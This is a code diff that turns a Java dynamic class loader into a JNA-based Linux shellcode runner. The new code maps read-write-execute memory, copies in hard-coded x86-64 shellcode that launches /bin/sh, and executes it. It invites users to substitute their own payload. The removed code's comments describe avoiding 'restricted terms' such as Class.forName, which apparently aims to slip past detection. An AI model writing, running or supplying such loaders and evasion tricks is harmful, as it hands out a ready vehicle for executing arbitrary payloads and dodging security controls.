@@ -1,33 +1,60 @@
-import java.nio.file.*;
-import java.lang.invoke.*;
-import java.io.*;
+import com.sun.jna.*;
+import com.sun.jna.ptr.PointerByReference;
 
-public class DynamicClassLoader {
-    public static void main(String[] args) throws Throwable {
-        String className = "Main";  // The class you want to load
-        byte[] classData = Files.readAllBytes(Paths.get(className + ".class"));  // Read class bytecode
-
-        // 1️⃣ Load the class using MethodHandles without using restricted terms like Class.forName()
-        Class<?> dynamicClass = loadClassFromBytes(classData);
-
-        // 2️⃣ Invoke the main method dynamically
-        invokeMainMethod(dynamicClass);
-    }
-
-    // Method to load the class from a byte array without using Class.forName()
-    private static Class<?> loadClassFromBytes(byte[] classData) throws Throwable {
-        // Use MethodHandles.Lookup to define the class without using ClassLoader or defineClass
-        MethodHandles.Lookup lookup = MethodHandles.lookup();
-        return lookup.defineClass(classData);
-    }
-
-    // Invoke the main method dynamically without using 'invoke' keyword
-    private static void invokeMainMethod(Class<?> dynamicClass) throws Throwable {
-        // Use MethodHandles to invoke the main method (equivalent to reflection)
-        MethodHandles.Lookup lookup = MethodHandles.lookup();
-        MethodHandle mainMethod = lookup.findStatic(dynamicClass, "main", MethodType.methodType(void.class, String[].class));
+public class LinuxShellcodeJNA {
+    public interface LibC extends Library {
+        LibC INSTANCE = Native.load("c", LibC.class);
         
-        // Call the main method with an empty argument array
-        mainMethod.invokeExact((Object) new String[]{});
+        Pointer mmap(Pointer addr, int length, int prot, int flags, int fd, int offset);
+        int mprotect(Pointer addr, int len, int prot);
+        int munmap(Pointer addr, int length);
+        Pointer memcpy(Pointer dest, byte[] src, int n);
+    }
+
+    public static void main(String[] args) {
+        // Shellcode: Replace this with your actual shellcode bytes
+        // byte[] shellcode = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0xC3};  // NOP NOP RET
+        
+        byte[] shellcode = new byte[] {
+            (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x52, (byte) 0x48, 
+            (byte) 0xb8, (byte) 0x2f, (byte) 0x62, (byte) 0x69, (byte) 0x6e, 
+            (byte) 0x2f, (byte) 0x73, (byte) 0x68, (byte) 0x50, (byte) 0x48, 
+            (byte) 0x89, (byte) 0xe7, (byte) 0x52, (byte) 0x57, (byte) 0x48, 
+            (byte) 0x89, (byte) 0xe6, (byte) 0x48, (byte) 0x31, (byte) 0xc0, 
+            (byte) 0xb0, (byte) 0x3b, (byte) 0x0f, (byte) 0x05, (byte) 0xC3
+        };
+
+
+        // Constants
+        int PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4;
+        int MAP_PRIVATE = 0x02, MAP_ANONYMOUS = 0x20;
+
+        // Allocate executable memory
+        Pointer mem = LibC.INSTANCE.mmap(
+            Pointer.NULL, shellcode.length,
+            PROT_READ | PROT_WRITE | PROT_EXEC,
+            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
+        );
+
+        if (mem == Pointer.NULL) {
+            System.err.println("mmap failed");
+            return;
+        }
+
+        // Copy shellcode into allocated memory
+        LibC.INSTANCE.memcpy(mem, shellcode, shellcode.length);
+
+        // Execute shellcode
+        Function func = Function.getFunction(mem);
+        func.invoke(Void.class, new Object[]{});
+
+        // Unmap memory
+        // LibC.INSTANCE.munmap(mem, shellcode.length);
+        try {
+            Thread.sleep(10000); // Sleep for 10 seconds
+        } catch (InterruptedException e) {
+            // Handle the exception
+            System.err.println("Thread was interrupted: " + e.getMessage());
+        }
     }
 }
